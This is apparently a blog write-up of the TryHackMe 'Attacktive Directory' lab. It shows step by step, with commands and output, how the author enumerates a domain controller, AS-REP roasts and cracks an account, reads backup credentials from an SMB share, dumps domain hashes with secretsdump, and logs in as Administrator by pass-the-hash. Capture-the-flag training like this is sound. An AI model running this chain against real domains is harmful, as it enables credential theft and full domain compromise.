---
layout: single
title: TryHackMe - Attacktive Directory
date: 2025-11-06
classes: wide
header:
  teaser: /assets/images/thm-attacktive-directory/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Medium
  - Windows
tags:
  - kerberos-user-enum
  - as-rep-roasting
  - hash-cracking
  - smb-enum
  - ntds-creds-extraction
  - pth
---

# Introduction
-------------

This writeup documents the penetration testing of the [**Attacktive Directory**](https://tryhackme.com/room/attacktivedirectory) machine from the [**TryHackMe**](https://tryhackme.com/) platform.

In this ocasion, I'll enumerate users, find users to do ASREPRoasting to generate a ticket , then enumerate shares as this user and finally perform Kerberoasting and perform PTH over this user.

<br>
# Information Gathering
------------------

Once we have discovered the IP of the machine we need to enumerate as much information as possible.

When we ping a machine that is in our local network, normally:
* TTL 64: Linux machine.
* TTL 128: Windows machine.
We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.

```java
❯ ping -c 1 10.10.221.181
PING 10.10.221.181 (10.10.221.181) 56(84) bytes of data.
64 bytes from 10.10.221.181: icmp_seq=1 ttl=127 time=54.5 ms

--- 10.10.221.181 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.500/54.500/54.500/0.000 ms
```

In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.221.181 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:32 CET
Initiating SYN Stealth Scan at 21:32
Scanning 10.10.221.181 [65535 ports]
Discovered open port 3389/tcp on 10.10.221.181
Discovered open port 445/tcp on 10.10.221.181
Discovered open port 135/tcp on 10.10.221.181
Discovered open port 139/tcp on 10.10.221.181
Discovered open port 80/tcp on 10.10.221.181
Discovered open port 53/tcp on 10.10.221.181
Discovered open port 49669/tcp on 10.10.221.181
Discovered open port 49669/tcp on 10.10.221.181
Discovered open port 49683/tcp on 10.10.221.181
Discovered open port 389/tcp on 10.10.221.181
Discovered open port 49675/tcp on 10.10.221.181
Discovered open port 49676/tcp on 10.10.221.181
Discovered open port 49664/tcp on 10.10.221.181
Discovered open port 49664/tcp on 10.10.221.181
Discovered open port 593/tcp on 10.10.221.181
Discovered open port 5985/tcp on 10.10.221.181
Discovered open port 464/tcp on 10.10.221.181
Discovered open port 49665/tcp on 10.10.221.181
Discovered open port 49679/tcp on 10.10.221.181
Discovered open port 49667/tcp on 10.10.221.181
Discovered open port 49667/tcp on 10.10.221.181
Discovered open port 3269/tcp on 10.10.221.181
Discovered open port 3268/tcp on 10.10.221.181
Discovered open port 3268/tcp on 10.10.221.181
Discovered open port 49672/tcp on 10.10.221.181
Discovered open port 3268/tcp on 10.10.221.181
Discovered open port 47001/tcp on 10.10.221.181
Discovered open port 9389/tcp on 10.10.221.181
Discovered open port 49712/tcp on 10.10.221.181
Discovered open port 49712/tcp on 10.10.221.181
Discovered open port 49712/tcp on 10.10.221.181
Increasing send delay for 10.10.221.181 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 636/tcp on 10.10.221.181
Discovered open port 49696/tcp on 10.10.221.181
Discovered open port 88/tcp on 10.10.221.181
Discovered open port 88/tcp on 10.10.221.181
Completed SYN Stealth Scan at 21:33, 55.60s elapsed (65535 total ports)
Nmap scan report for 10.10.221.181
Host is up, received user-set (0.065s latency).
Scanned at 2025-11-06 21:32:24 CET for 56s
Not shown: 51052 closed tcp ports (reset), 14456 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49672/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 55.71 seconds
           Raw packets sent: 275840 (12.137MB) | Rcvd: 60645 (2.426MB)
```

Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

```java
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49683,49696,49712 10.10.221.181 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:34 CET
Nmap scan report for 10.10.221.181
Host is up (0.080s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-06 20:34:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-06T20:35:43+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-06T20:35:33+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-11-05T20:26:46
|_Not valid after:  2026-05-07T20:26:46
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-06T20:35:35
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.43 seconds
```

We have the first 3 flags of the machine in the Nmap output. Nmap found some open ports and we can extract a lot of information from this big output:

- Open ports like 53, 88, 139, 445... are a good indication that we are facing a **Windows Domain Controller**.
- The FQDN of the targeted machine is ``AttacktiveDirectory.spookysec.local`` and the target domain is ``spookysec.local``

I'll add this in my ``/etc/hosts`` file:

```
10.10.221.181 AttacktiveDirectory.spookysec.local spookysec.local
```

<br>
# Vulnerability Assessment
-----------

Now, we can perform **bruteforce** over Kerberos (port 88) with the tool [**Kerbrute**](https://github.com/ropnop/kerbrute/releases) to enumerate users, passwords and even password spray. I'll use the wordlist that you can find in the description of this machine.

```php
❯ ./kerbrute_linux_amd64 userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/06/25 - Ronnie Flathers @ropnop

2025/11/06 21:54:44 >  Using KDC(s):
2025/11/06 21:54:44 >  	AttacktiveDirectory.spookysec.local:88

2025/11/06 21:54:45 >  [+] VALID USERNAME:	james@spookysec.local
2025/11/06 21:54:46 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2025/11/06 21:54:48 >  [+] VALID USERNAME:	robin@spookysec.local
2025/11/06 21:54:55 >  [+] VALID USERNAME:	darkstar@spookysec.local
2025/11/06 21:54:59 >  [+] VALID USERNAME:	administrator@spookysec.local
2025/11/06 21:55:08 >  [+] VALID USERNAME:	backup@spookysec.local
2025/11/06 21:55:12 >  [+] VALID USERNAME:	paradox@spookysec.local
2025/11/06 22:01:36 >  [+] VALID USERNAME:	ori@spookysec.local
...
```

The notable accounts of this list are ``svc-admin`` and ``backup``.

> **ASREPRoasting** occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket for the specified user account.

<br>
# Exploitation
-------

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called GetNPUsers.pythat will allow us to query ASReproastable accounts from the Key Distribution Center using the list of users we got before.

```bash
❯ GetNPUsers.py spookysec.local/svc-admin -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0afe***REDACTED_HASH***
❯ GetNPUsers.py spookysec.local/backup -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for backup
[-] User backup doesn`t have UF_DONT_REQUIRE_PREAUTH set
```

We have got a TGT for svc-admin. We can try to identify the provided hash in this page: https://hashcat.net/wiki/doku.php?id=example_hashes  

The hash is a ``Kerberos 5 AS-REP etype 23``, mode 18200. Now, I'll try to crack the hash with the password's wordlist provided.

```bash
❯ john -w:../scripts/passwordlist.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***REDACTED_PASSWORD***   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:00 DONE (2025-11-06 22:22) 2.500g/s 17920p/s 17920c/s 17920C/s ghetto1..frida
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We have valid credentials in the domain, so now we can attempt to enumerate shared resources of the DC. I'll use ``smbclient``.

```python
❯ smbclient -L //10.10.221.181 -U svc-admin
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.221.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

❯ smbclient //10.10.221.181/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 3592887 blocks available
smb: \> 
```

We have base64 encoded backup credentials. Let's decode the credentials of the backup user.

```bash
❯ echo "***REDACTED***" | base64 -d; echo
***REDACTED***
```

<br>
# Post-Exploitation
---------

The backup user is the backup account for the Domain Controller. This account has a permission that allows all AD changes to be synced with this user account and this includes password hashes.

I'll use a Impacket tool called ``secretsdump.py``. This will dump all password hashes that this user has.

```python
❯ secretsdump.py -just-dc backup@spookysec.local
...
Administrator:500:***REDACTED***:::
...
```

Now, let's perform PTH.

```python
❯ evil-winrm -i 10.10.221.181 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

And in the Desktop folder of each user you'll find the flags. That's all for this ocasion!










